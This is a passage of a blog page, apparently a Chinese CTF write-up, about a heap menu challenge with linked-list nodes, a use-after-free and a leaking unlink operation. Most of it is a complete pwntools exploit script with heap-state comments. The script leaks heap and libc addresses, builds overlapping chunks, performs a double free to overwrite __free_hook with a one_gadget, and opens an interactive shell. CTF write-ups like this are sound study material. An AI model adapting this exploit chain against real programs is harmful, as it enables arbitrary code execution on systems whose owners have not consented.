class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:1</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:null</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#dele chunk1 and chunk2</span></span><br><span class=\"line\">dele(<span class=\"number\">10</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#after dele chunk1 and chunk2</span></span><br><span class=\"line\"><span class=\"comment\"># tcachebins : chunk2=&gt;chunk1</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20 [  3]: 0x5631022d53d0 —▸ 0x5631022d5360 —▸ 0x5631022d58a0 ◂— 0x0 link chunk2 and chunk13 so next-&gt;chunk13</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50 [  3]: 0x5631022d5380 —▸ 0x5631022d5310 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...(2a0是pre_size，也就是chunk0的content)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:null</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Index:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak heap base by chunk2_content.fd(chunk1_content) - offset.</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Offset 1:&quot;</span>)</span><br><span class=\"line\">heap_base = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x310</span></span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;heap_base : &quot; + hex(heap_base))</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:null</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=10 chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=11 chunk1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#set idx 11 size , to get unsorted bin</span></span><br><span class=\"line\">payload = p64(heap_base + <span class=\"number\">0x2a0</span>) + p64(<span class=\"number\">0x441</span>) + <span class=\"string\">b&#x27;aaaaaaaa&#x27;</span>(+<span class=\"number\">0x2a0</span>是为了保持原来的数据)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,payload)<span class=\"comment\">#idx=12 0x5631022d58a0 -&gt; content == 0x5631022d52f0</span></span><br><span class=\"line\"><span class=\"comment\">#now the size of chunk1 is 0x441 , prev_size =0x5631022d52a0(chunk0的content)</span></span><br><span class=\"line\"><span class=\"comment\">#add后 0x50 [  0]: 0x5631022d52a0 ◂— ...(chunk0的content)导致的free，但实际上没执行free</span></span><br><span class=\"line\"><span class=\"comment\">#unsorted bin</span></span><br><span class=\"line\">dele(<span class=\"number\">11</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># unsortedbin</span></span><br><span class=\"line\"><span class=\"comment\"># all: 0x5631022d5300 —▸ 0x7f1998a0bbe0 (main_arena+96) ◂— 0x5631022d5300</span></span><br><span class=\"line\"><span class=\"comment\"># 0x5631022d5300:\t0x00005631022d52a0\t0x0000000000000441</span></span><br><span class=\"line\"><span class=\"comment\"># 0x5631022d5310:\t0x00007f1998a0bbe0\t0x00007f1998a0bbe0</span></span><br><span class=\"line\"><span class=\"comment\">#修改了size之后，后续9个chunk（含content）和1个content也被包含在chunk1的content中</span></span><br><span class=\"line\"><span class=\"comment\">#即一直到chun10的content都被包含了，chunk10本体并没有</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>) <span class=\"comment\">#idx=11</span></span><br><span class=\"line\"><span class=\"comment\">#从chunk1 size==0x441的bin中切割出size==0x71的chunk作为content</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#unlink to leak</span></span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）</span></span><br><span class=\"line\"><span class=\"comment\">#list[12]:14</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Index:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libc base</span></span><br><span class=\"line\"><span class=\"comment\">#此时原来chunk2的content在0x3d1大小的chunk的起始位置</span></span><br><span class=\"line\"><span class=\"comment\">#通过unlink输出content中的unsortbin头</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Offset 1:&quot;</span>)</span><br><span class=\"line\">libc_base = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">96</span> - <span class=\"number\">0x10</span> - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xe6c81</span></span><br><span class=\"line\">one_gadget_addr = libc_base + one_gadget</span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;libc_base : &quot; + hex(libc_base))</span></span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;free_hook : &quot; + hex(free_hook))</span></span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;one_gadget_addr : &quot; + hex(one_gadget_addr))</span></span><br><span class=\"line\"><span class=\"comment\"># log.info(&quot;heap_base : &quot; + hex(heap_base))</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fill of tcache</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">4</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">5</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">6</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">7</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#11=&gt;10=&gt;9=&gt;8=&gt;7=&gt;6=&gt;0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#use list[3]</span></span><br><span class=\"line\">unlink(<span class=\"number\">3</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#double free</span></span><br><span class=\"line\">dele(<span class=\"number\">3</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>,<span class=\"number\">255</span>)</span><br><span class=\"line\"><span class=\"comment\">#fast bin5=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）</span></span><br><span class=\"line\"><span class=\"comment\">#list[12]:14</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">10</span>)</span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">11</span>)</span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">12</span>)</span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:2=&gt;13=&gt;2=&gt;1=&gt;14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:0</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[12]:null</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fast bin5=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0</span></span><br><span class=\"line\"><span class=\"comment\">#通过double free 后的add修改tcache的指针指向</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(free_hook) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">link(<span class=\"number\">10</span>,<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># tcachebins</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20 [  3]: 0x5631022d54b0 —▸ 0x5631022d5520 ◂— 0x0</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50 [  4]: 0x5631022d52b0 —▸ 0x5631022d5460 —▸ 0x5631022d54d0 —▸ 0x7f1998a0de48 (__free_hook) ◂— 0x0</span></span><br><span class=\"line\"><span class=\"comment\">#连续申请4个来改写__free_hook,tcache不会检查size</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(free_hook) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(free_hook) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(free_hook) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#15</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,p64(one_gadget_addr) + <span class=\"string\">b&#x27;aaaa&#x27;</span>)<span class=\"comment\">#16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:2=&gt;13=&gt;2=&gt;1=&gt;14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:0</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:4</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:5=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:5</span></span><br><span class=\"line\"><span class=\"comment\">#list[12]:15</span></span><br><span class=\"line\"><span class=\"comment\">#list[13]:16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#调用free,执行one_gadget</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Index\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>在链表中非常复杂的fast bin double free。</p>","more":"<p>64位菜单题，大部分保护都开了</p>\n<p>里面有个链表的数组chunk_list，还有记录每个链表中节点个数的数组chunk_num。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">node</span>    //固定0<span class=\"title\">x18</span>大小</span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    node* next;    <span class=\"comment\">//指向下一个node</span></span><br><span class=\"line\">    <span class=\"type\">int</span> size;    <span class=\"comment\">//content的chunk的user size,size&lt;=0x70</span></span><br><span class=\"line\">    _Qword* content;    <span class=\"comment\">//content指针，指向malloc(size)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>大概有4个功能，增加结点(add)、删除结点(delete)、连接(link)、解除连接(unlink)</p>\n<p>add是创建一个node以及其content，在chunk_list中找到一个idx最小的空位，将node放到那里。</p>\n<p>delete有两种模式，如果输入的offset==255,那么则是把这一条链表的node及其content从头到尾进行free，否则是free该链表的第offset个node和content。delete处存在UAF，如果offset!=255，free后的node中仍保存着content指针,并且content内容不会改变。</p>\n<p>link是将两个chunk_list连接在一起，dest_list会链接到src_list的末尾，并且chunk_list[dest]=0，让它指向空。</p>\n<p>unlink是根据offset将一个chunk从chunk_list中取出，第offset个chunk会成为idx最小的空chunk_list的第1个chunk，<strong>但是分出去的chunk的next部分没有清空，仍然指向原来后续的chunk</strong>。除此之外，unlink会<strong>输出</strong>该chunk_list下所有chunk的content，可以用来泄露。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span 